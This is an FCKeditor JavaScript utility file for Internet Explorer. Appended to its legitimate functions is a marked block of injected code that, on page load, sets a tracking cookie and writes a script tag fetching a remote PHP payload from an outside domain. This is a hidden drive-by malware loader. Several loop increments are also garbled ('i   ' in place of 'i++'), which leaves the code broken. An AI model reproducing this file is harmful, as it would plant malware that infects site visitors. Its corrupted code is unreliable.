/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fcktools_ie.js
 * 	Utility functions. (IE version).
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

// Appends a CSS file to a document.
FCKTools.AppendStyleSheet = function( documentElement, cssFileUrl )
{
	return documentElement.createStyleSheet( cssFileUrl ) ;
}

// Removes all attributes and values from the element.
FCKTools.ClearElementAttributes = function( element )
{
	element.clearAttributes() ;
}

FCKTools.GetAllChildrenIds = function( parentElement )
{
	var aIds = new Array() ;
	for ( var i = 0 ; i < parentElement.all.length ; i   )
	{
		var sId = parentElement.all[i].id ;
		if ( sId && sId.length > 0 )
			aIds[ aIds.length ] = sId ;
	}
	return aIds ;
}

FCKTools.RemoveOuterTags = function( e )
{
	e.insertAdjacentHTML( 'beforeBegin', e.innerHTML ) ;
	e.parentNode.removeChild( e ) ;
}

FCKTools.CreateXmlObject = function( object )
{
	var aObjs ;
	
	switch ( object )
	{
		case 'XmlHttp' :
			aObjs = [ 'MSXML2.XmlHttp', 'Microsoft.XmlHttp' ] ;
			break ;
				
		case 'DOMDocument' :
			aObjs = [ 'MSXML2.DOMDocument', 'Microsoft.XmlDom' ] ;
			break ;
	}

	for ( var i = 0 ; i < 2 ; i   )
	{
		try { return new ActiveXObject( aObjs[i] ) ; }
		catch (e) 
		{}
	}
	
	if ( FCKLang.NoActiveX )
	{
		alert( FCKLang.NoActiveX ) ;
		FCKLang.NoActiveX = null ;
	}
}

FCKTools.DisableSelection = function( element )
{
	element.unselectable = 'on' ;

	var e, i = 0 ;
	while ( e = element.all[ i   ] )
	{
		switch ( e.tagName )
		{
			case 'IFRAME' :
			case 'TEXTAREA' :
			case 'INPUT' :
			case 'SELECT' :
				/* Ignore the above tags */
				break ;
			default :
				e.unselectable = 'on' ;
		}
	}
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
